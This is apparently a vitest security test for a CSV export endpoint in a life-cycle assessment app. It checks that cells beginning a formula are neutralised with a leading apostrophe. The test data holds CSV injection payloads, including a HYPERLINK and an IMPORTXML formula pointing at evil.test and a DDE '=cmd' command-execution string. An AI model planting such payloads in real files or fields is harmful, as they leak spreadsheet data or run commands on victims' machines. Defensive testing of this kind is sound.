/**
 * CSV formula injection (L5 / EXP-3) in GET /api/assessments/:id/export?format=csv:
 * a step, substance, project or case name that a spreadsheet would run as a
 * formula (= + - @ TAB CR at the start of a cell) is written with a leading
 * apostrophe and quoted; real numbers, negatives included, stay numbers.
 */
import { beforeAll, describe, expect, it } from 'vitest';
import { api } from '../support/api';
import { parseCsv } from '../support/csv';
import { addFlow, createCase, createComponent, createProject, runAssessment, substanceId } from '../support/world';
import { createUser, type TestUser } from '../support/users';

const STEPS = ['=1+1', '+1', '-1+2', '@SUM(1,1)', '\tfoo', '\rbar', '=HYPERLINK("http://evil.test/?"&A1,"click")', "=cmd|' /C calc'!A0"];

let u: TestUser;
let runId: number;
let substanceName: string;
beforeAll(async () => {
  u = await createUser('csvinj');
  const pid = await createProject(u, `=IMPORTXML("http://evil.test") ${u.id}`, { lcia_method: 'CML 2001', region_code: 'US' });
  const caseId = await createCase(u, pid, '+case name');
  const product = await createComponent(u, caseId, { component_name: '@product', component_type: 'product' });
  substanceName = `=cmd substance ${u.id}`;
  const custom = await api.post('/api/substances', {
    token: u.token,
    json: { name: substanceName, kind: 'input', unit: 'kg', method: 'CML 2001', impactCategory: 'Global Warming', factorValue: 2, source: 'Supplier EPD 2025' },
  });
  expect(custom.status).toBe(201);
  const electricity = await substanceId('Electricity');
  for (const name of STEPS) {
    const step = await createComponent(u, caseId, { component_name: name, component_type: 'operation', parent_component_id: product });
    await addFlow(u, step, { substance_id: electricity, flow_type: 'input', quantity: 1, unit: 'kWh' });
  }
  const last = await createComponent(u, caseId, { component_name: 'plain step', component_type: 'operation', parent_component_id: product });
  await addFlow(u, last, { substance_id: Number(custom.json.substance.substance_id), flow_type: 'input', quantity: 0.5, unit: 'kg' });
  runId = Number((await runAssessment(u, caseId)).run_id);
});

describe('CSV formula injection', () => {
  it('no cell starts a formula, except plain numbers', async () => {
    const res = await api.get(`/api/assessments/${runId}/export?format=csv`, { token: u.token });
    expect(res.status).toBe(200);
    const rows = parseCsv(res.text);
    const numeric = /^[+-]?(\d+\.?\d*|\.\d+)(e[+-]?\d+)?$/i;
    for (const row of rows) for (const cell of row) {
      if (/^[=+\-@\t\r]/.test(cell)) expect(numeric.test(cell), `live formula: ${JSON.stringify(cell)}`).toBe(true);
    }
  });

  it('each dangerous name is kept, behind an apostrophe', async () => {
    const res = await api.get(`/api/assessments/${runId}/export?format=csv`, { token: u.token });
    const cells = new Set(parseCsv(res.text).flat());
    // "+1" reads as the number 1 in a spreadsheet, not a formula: kept as is.
    expect(cells.has('+1')).toBe(true);
    for (const name of STEPS.filter((n) => n !== '+1')) expect(cells.has(`'${name}`), JSON.stringify(name)).toBe(true);
    expect(cells.has(`'${substanceName}`)).toBe(true);
    // A carriage return inside a cell is quoted, so it cannot split the row.
    expect(res.text).toContain(`"'\rbar"`);
  });

  it('header lines start with "#", so names there never begin a cell', async () => {
    const res = await api.get(`/api/assessments/${runId}/export?format=csv`, { token: u.token });
    const header = parseCsv(res.text).filter((r) => r[0].startsWith('#')).map((r) => r[0]);
    expect(header.find((h) => h.startsWith('# Project:'))).toContain('=IMPORTXML');
    expect(header.find((h) => h.startsWith('# Case:'))).toBe('# Case: +case name');
  });
});
